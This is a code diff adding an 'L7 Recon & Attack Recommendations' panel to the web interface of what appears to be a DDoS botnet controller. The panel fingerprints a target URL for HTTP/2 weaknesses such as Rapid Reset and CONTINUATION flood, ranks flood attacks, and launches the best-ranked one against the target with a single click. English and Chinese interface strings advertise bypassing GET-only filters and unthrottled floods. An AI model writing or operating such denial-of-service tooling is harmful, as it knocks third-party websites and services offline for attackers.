@@ -300,6 +300,57 @@
     <div class="warning" x-show="nodes.length === 0" x-text="t('no_workers_warn')"></div>
   </div>
 
+  <!-- L7 Recon & Recommendations -->
+  <div class="panel">
+    <h2 x-text="t('l7_recon')"></h2>
+    <div class="scan-row">
+      <input x-model.trim="l7Test.target" :placeholder="t('l7_target_ph')" style="flex:1">
+      <button class="btn" @click="runL7Test()" :disabled="l7Test.testing" x-text="t('l7_test_btn')"></button>
+    </div>
+    <div class="warning" x-show="l7Test.testing" x-text="t('l7_testing')"></div>
+    <div x-show="l7Test.error" style="color:var(--red);font-size:11px;margin-top:6px" x-text="l7Test.error"></div>
+
+    <template x-if="l7Test.result">
+      <div style="margin-top:10px">
+        <!-- 指纹卡 -->
+        <div style="border:1px solid var(--border);border-radius:4px;padding:8px;font-size:11px">
+          <div style="display:flex;gap:14px;flex-wrap:wrap">
+            <span><span style="opacity:0.6" x-text="t('l7_server')+': '"></span><b x-text="l7Test.result.fingerprint.server_header||'-'"></b></span>
+            <span x-show="l7Test.result.fingerprint.product"><span style="opacity:0.6" x-text="t('l7_product')+': '"></span><b x-text="l7Test.result.fingerprint.product"></b></span>
+            <span x-show="l7Test.result.fingerprint.version"><span style="opacity:0.6" x-text="t('l7_version')+': '"></span><b x-text="l7Test.result.fingerprint.version"></b></span>
+            <span><span style="opacity:0.6" x-text="t('l7_proto')+': '"></span><b x-text="l7ProtoLabel()"></b></span>
+            <span x-show="l7Test.result.fingerprint.tls_issuer"><span style="opacity:0.6" x-text="t('l7_tls')+': '"></span><b x-text="l7Test.result.fingerprint.tls_issuer"></b></span>
+          </div>
+          <!-- 漏洞徽章 -->
+          <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
+            <span x-show="l7Test.result.fingerprint.vulnerable" style="background:rgba(255,60,60,.15);color:#f66;border:1px solid #f66;border-radius:3px;padding:2px 8px">⚠ CVE-2023-44487 Rapid Reset</span>
+            <span x-show="l7Test.result.fingerprint.continuation_vuln" style="background:rgba(255,140,0,.15);color:#fa0;border:1px solid #fa0;border-radius:3px;padding:2px 8px">⚠ CONTINUATION Flood (CVE-2024-27316)</span>
+            <span x-show="l7Test.result.fingerprint.bomb_vuln" style="background:rgba(255,60,60,.15);color:#f66;border:1px solid #f66;border-radius:3px;padding:2px 8px">⚠ HPACK Bomb (CVE-2026-49975)</span>
+            <span x-show="!l7Test.result.fingerprint.vulnerable && !l7Test.result.fingerprint.continuation_vuln && !l7Test.result.fingerprint.bomb_vuln" style="color:var(--green)" x-text="'✓ '+t('l7_no_vuln')"></span>
+          </div>
+          <!-- 探测备注 -->
+          <div x-show="l7Test.result.fingerprint.notes && l7Test.result.fingerprint.notes.length" style="margin-top:8px;opacity:0.7;font-size:10px">
+            <template x-for="(n,i) in l7Test.result.fingerprint.notes" :key="i">
+              <div x-text="'• '+n"></div>
+            </template>
+          </div>
+        </div>
+
+        <!-- 推荐列表 -->
+        <div style="margin-top:10px;font-size:11px;color:var(--cyan)" x-text="t('l7_recs')"></div>
+        <template x-for="(rec,i) in l7Test.result.recommendations" :key="rec.method">
+          <div style="display:flex;align-items:center;gap:8px;border:1px solid var(--border);border-radius:4px;padding:6px 8px;margin-top:4px">
+            <span x-show="i===0" style="color:var(--yellow);font-size:10px;white-space:nowrap" x-text="'★ '+t('l7_best')"></span>
+            <span style="color:var(--cyan);font-weight:bold;font-size:11px;min-width:170px" x-text="t('method_'+rec.method)"></span>
+            <span style="flex:1;font-size:10px;opacity:0.8" x-text="t(rec.reason_key)"></span>
+            <button class="btn sm" @click="launchL7Rec(rec)" style="flex:0;white-space:nowrap" x-text="t('l7_launch')"></button>
+          </div>
+        </template>
+        <button class="btn" @click="launchL7Best()" style="margin-top:8px;width:100%" x-text="t('l7_launch_best')"></button>
+      </div>
+    </template>
+  </div>
+
   <!-- Target Guard -->
   <div class="panel">
     <h2 x-text="t('guard') + (guard.enabled ? ' 🛡' : ' ⚠')"></h2>
@@ -858,6 +909,17 @@ function app() {
       update_confirm_workers:'Set all Workers to update to the latest version? They will auto-update within ~60s.',
       update_all_btn:'Upgrade All', update_confirm_all:'Upgrade Controller + all Workers to the latest version? Workers update first (~60s), then the Controller restarts itself.',
       update_all_started:'Upgrade started: Workers updating, Controller will restart in a few seconds.',
+      l7_recon:'L7 Recon & Attack Recommendations', l7_target_ph:'Target URL (http:// or https://)', l7_test_btn:'Probe', l7_testing:'Probing target: HTTP/2 support (ALPN/h2c), response headers, CVE version tables...',
+      l7_error_required:'Enter a target URL first',
+      l7_recs:'Recommended attacks — CVE first, traffic fallback', l7_best:'BEST', l7_launch:'Launch', l7_launch_best:'🚀 Launch Top Recommendation',
+      l7_no_vuln:'No known HTTP/2 CVE weakness detected', l7_proto:'Protocol', l7_server:'Server', l7_product:'Product', l7_version:'Version', l7_tls:'TLS Issuer',
+      l7_rec_bomb:'HPACK Bomb vulnerable (IIS kernel-mode / unpatched) — highest impact; auto-gated on server side',
+      l7_rec_reset:'CVE-2023-44487 Rapid Reset — target version vulnerable',
+      l7_rec_cont:'CONTINUATION Flood (CVE-2024-27316 etc.) — target version vulnerable',
+      l7_rec_http:'Generic HTTP flood — raw fire-and-forget writes, not RTT-bound',
+      l7_rec_post:'POST flood — business-layer pressure (DB/log), bypasses GET-only filters',
+      l7_rec_h2:'HTTP/2 flood — multiplexed stream pressure (target supports HTTP/2)',
+      l7_rec_h2_noalpn:'HTTP/2 not detected — try only if target actually speaks h2 (h2c / hidden ALPN)',
       gh_token_ph:'GitHub token (optional, 5000 req/h)', gh_token_saved:'GitHub token saved.', update_latest:'(latest)',
       deploy_tip:'Command auto-concatenates controller address + worker token.\nNon-root users: -daemon runs in background without nohup (log: data/worker.log).\n-install and -daemon are mutually exclusive.',
       attack_logs:'Attack Logs', all_methods:'All Methods', export_csv:'Export CSV',
@@ -926,6 +988,17 @@ function app() {
       update_confirm_workers:'将所有 Worker 更新到最新版本？它们将约 60 秒内自动更新。',
       update_all_btn:'整体升级', update_confirm_all:'将 Controller 和所有 Worker 升级到最新版本？Worker 先更新（约 60s），随后 Controller 自动重启。',
       update_all_started:'升级已开始：Worker 正在更新，Controller 几秒后自动重启。',
+      l7_recon:'L7 侦察与攻击推荐', l7_target_ph:'目标 URL (http:// 或 https://)', l7_test_btn:'检测', l7_testing:'正在探测：HTTP/2 支持 (ALPN/h2c)、响应头、CVE 版本表...',
+      l7_error_required:'请先输入目标 URL',
+      l7_recs:'推荐攻击 —— CVE 优先，流量型兜底', l7_best:'首选', l7_launch:'发起', l7_launch_best:'🚀 一键发起首选推荐',
+      l7_no_vuln:'未发现已知 HTTP/2 CVE 脆弱点', l7_proto:'协议', l7_server:'Server', l7_product:'组件', l7_version:'版本', l7_tls:'TLS 签发者',
+      l7_rec_bomb:'HPACK Bomb 脆弱（IIS 内核态 / 未修复版本）—— 影响最大；服务端自动门控兜底',
+      l7_rec_reset:'CVE-2023-44487 Rapid Reset —— 目标版本存在漏洞',
+      l7_rec_cont:'CONTINUATION 洪水 (CVE-2024-27316 等) —— 目标版本存在漏洞',
+      l7_rec_http:'通用 HTTP 洪水 —— RAW 连续写入，不受 RTT 限制',
+      l7_rec_post:'POST 洪水 —— 业务层压力（数据库/日志），绕过只挡 GET 的防护',
+      l7_rec_h2:'HTTP/2 洪水 —— 多路复用流压力（目标支持 HTTP/2）',
+      l7_rec_h2_noalpn:'未探测到 HTTP/2 —— 仅当目标实际支持 h2（h2c / 隐藏 ALPN）时尝试',
       gh_token_ph:'GitHub Token (可选, 5000次/小时)', gh_token_saved:'GitHub Token 已保存。', update_latest:'(最新)',
       deploy_tip:'命令自动拼接控制器地址 + worker 令牌。\n非 root 用户: -daemon 免 nohup 后台运行 (日志: data/worker.log)。\n-install 与 -daemon 互斥。',
       attack_logs:'攻击日志', all_methods:'所有方法', export_csv:'导出CSV',
@@ -955,6 +1028,7 @@ function app() {
     scan:{ startIP:'', endIP:'', port:27015, results:[], scanning:false, error:'' },
     dnsScan:{ startIP:'', endIP:'', port:53, results:[], resultCount:0, scanning:false, error:'' },
     cldapScan:{ startIP:'', endIP:'', port:389, results:[], resultCount:0, scanning:false, error:'' },
+    l7Test:{ target:'', testing:false, error:'', result:null },
     proxyData:'',
     dnsAmpDomain:'',
     steamList:[], steamCount:0, steamScanning:false, steamStatus:'',
@@ -1188,9 +1262,44 @@ function app() {
     },
     removeSubAttack(idx) { this.form.sub_attacks.splice(idx,1); },
 
-    async startScan() {
-      this.scan.scanning=true; this.scan.results=[]; this.scan.error='';
+    // —— L7 侦察与推荐 ——
+    async runL7Test() {
+      const target = (this.l7Test.target||'').trim();
+      if (!target) { alert(this.t('l7_error_required')); return; }
+      this.l7Test.testing=true; this.l7Test.error=''; this.l7Test.result=null;
       try {
+        const r = await fetch('/api/l7/test',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify({target})});
+        const d = await r.json();
+        if (!r.ok || d.error) { this.l7Test.error = d.error||('HTTP '+r.status); return; }
+        this.l7Test.result = d;
+      } catch(e) { this.l7Test.error = 'Network error: '+e.message; }
+      this.l7Test.testing=false;
+    },
+    l7ProtoLabel() {
+      const fp = this.l7Test.result ? this.l7Test.result.fingerprint : null;
+      if (!fp) return '-';
+      if (fp.http2) return 'HTTP/2';
+      if (fp.http2c) return 'HTTP/2 (h2c)';
+      return 'HTTP/1.1';
+    },
+    // 预填攻击表单并直接发起（startAttack 自带红色确认弹窗）
+    launchL7Rec(rec) {
+      this.form.method = rec.method;
+      this.form.target = this.l7Test.target;
+      if (rec.params) {
+        if (rec.params.threads) this.form.threads = rec.params.threads;
+        if (rec.params.duration) this.form.duration = rec.params.duration;
+      }
+      document.querySelector('.layout') && document.querySelector('.layout').scrollIntoView({behavior:'smooth'});
+      this.startAttack();
+    },
+    launchL7Best() {
+      const recs = this.l7Test.result && this.l7Test.result.recommendations;
+      if (recs && recs.length) this.launchL7Rec(recs[0]);
+    },
+
+    async startScan() {
+      this.scan.scanning=true; this.scan.results=[]; this.scan.error='';      try {
         const isSingle = this.scan.startIP && this.scan.startIP===this.scan.endIP;
         const body = isSingle?JSON.stringify({ip:this.scan.startIP,port:this.scan.port}):JSON.stringify({start_ip:this.scan.startIP,end_ip:this.scan.endIP,port:this.scan.port,concurrency:50});
         const r = await fetch('/api/scan',{method:'POST',headers:this.getAuthHeaders(),body});
